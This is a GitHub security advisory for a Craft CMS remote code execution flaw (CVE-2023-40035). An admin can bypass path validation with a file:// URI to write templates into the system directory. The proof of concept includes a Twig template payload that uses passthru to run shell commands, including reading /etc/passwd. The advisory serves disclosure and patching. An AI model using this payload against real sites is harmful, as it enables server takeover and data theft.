# [H] Craft CMS vulnerable to Remote Code Execution via validatePath bypass

## Summary
Severity: High
Advisory: GHSA-44wr-rmwq-3phw
CVE: CVE-2023-40035
CWE: CWE-74
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2023-08-21
Source: https://github.com/advisories/GHSA-44wr-rmwq-3phw
Type: github-advisory

## Affected
- Packagist: `craftcms/cms` — affected >=4.0.0-RC1 <4.4.15
- Packagist: `craftcms/cms` — affected >=3.0.0 <3.8.15

## Details
### Summary
Bypassing the validatePath function can lead to potential Remote Code Execution
(Post-authentication, ALLOW_ADMIN_CHANGES=true)

### Details

In bootstrap.php, the SystemPaths path is set as below.
```php
// Set the vendor path. By default assume that it's 4 levels up from here
$vendorPath = $findConfigPath('--vendorPath', 'CRAFT_VENDOR_PATH') ?? dirname(__DIR__, 3);

// Set the "project root" path that contains config/, storage/, etc. By default assume that it's up a level from vendor/.
$rootPath = $findConfigPath('--basePath', 'CRAFT_BASE_PATH') ?? dirname($vendorPath);

// By default the remaining directories will be in the base directory
$dotenvPath = $findConfigPath('--dotenvPath', 'CRAFT_DOTENV_PATH') ?? "$rootPath/.env";
$configPath = $findConfigPath('--configPath', 'CRAFT_CONFIG_PATH') ?? "$rootPath/config";
$contentMigrationsPath = $findConfigPath('--contentMigrationsPath', 'CRAFT_CONTENT_MIGRATIONS_PATH') ?? "$rootPath/migrations";
$storagePath = $findConfigPath('--storagePath', 'CRAFT_STORAGE_PATH') ?? "$rootPath/storage";
$templatesPath = $findConfigPath('--templatesPath', 'CRAFT_TEMPLATES_PATH') ?? "$rootPath/templates";
$translationsPath = $findConfigPath('--translationsPath', 'CRAFT_TRANSLATIONS_PATH') ?? "$rootPath/translations";
$testsPath = $findConfigPath('--testsPath', 'CRAFT_TESTS_PATH') ?? "$rootPath/tests";
```

Because paths are validated based on the /path1/path2 format, this can be bypassed using a file URI scheme such as file:///path1/path2. File scheme is supported in mkdir()
```php
    /**
     * @param string $attribute
     * @param array|null $params
     * @param InlineValidator $validator
     * @return void
     * @since 4.4.6
     */
    public function validatePath(string $attribute, ?array $params, InlineValidator $validator): void
    {
        // Make sure it’s not within any of the system directories
        $path = FileHelper::absolutePath($this->getRootPath(), '/');

        $systemDirs = Craft::$app->getPath()->getSystemPaths();

        foreach ($systemDirs as $dir) {
            $dir = FileHelper::absolutePath($dir, '/');
            if (str_starts_with("$path/", "$dir/")) {
                $validator->addError($this, $attribute, Craft::t('app', 'Local volumes cannot be located within system directories.'));
                break;
            }
        }
    }
```

ref. https://www.php.net/manual/en/wrappers.file.php



### PoC
1) Create a new filesystem. **Base Path: file:///var/www/html/templates**

![1](https://user-images.githubusercontent.com/30969523/249252853-5cde9bae-9279-428a-972b-d4444c545819.png)


2) Create a new asset volume. Asset Filesystem: local_bypass

![2](https://user-images.githubusercontent.com/30969523/249256711-e37da7f8-52d6-4ecc-bfc4-b9b9d8a2230d.png)


3) Upload a ttml file with rce template code. Confirm poc.ttml file created in /var/www/html/templates
```twig
{{'<pre>'}}
{{1337*1337}}
{{['cat /etc/passwd']|map('passthru')|join}}
{{['id;pwd;ls -altr /']|map('passthru')|join}}
```
![3](https://user-images.githubusercontent.com/30969523/249256731-8dafc3dc-4937-4f69-bba0-97bc96be1ada.png)
![4](https://user-images.githubusercontent.com/30969523/249257369-54e22aff-3919-4a21-b696-a7be74086ff9.png)


4) Create a new route. URI: * , Template: poc.ttml

![5](https://user-images.githubusercontent.com/30969523/249257437-972ec725-8197-4472-9b57-750ab91d9bfd.png)


5) Confirm RCE on arbitrary path ( /* )

![6](https://user-images.githubusercontent.com/30969523/249257465-061dbaf8-a2c6-4366-80f5-986a15bad748.png)


#### PoC Env

![0628 env](https://user-images.githubusercontent.com/30969523/249252784-6e5913ad-9ad1-4d3a-a70f-2c5ff9f55166.png)


### Impact
Take control of vulnerable systems, Data exfiltrations, Malware execution, Pivoting, etc.

although the vulnerability is exploitable only in the authenticated users, configuration with ALLOW_ADMIN_CHANGES=true, there is still a potential security threat (Remote Code Execution)

## References
- https://github.com/craftcms/cms/security/advisories/GHSA-44wr-rmwq-3phw
- https://nvd.nist.gov/vuln/detail/CVE-2023-40035
- https://github.com/craftcms/cms/commit/0bd33861abdc60c93209cff03eeee54504d3d3b5
- https://github.com/craftcms/cms
- https://github.com/craftcms/cms/releases/tag/3.8.15
- https://github.com/craftcms/cms/releases/tag/4.4.15
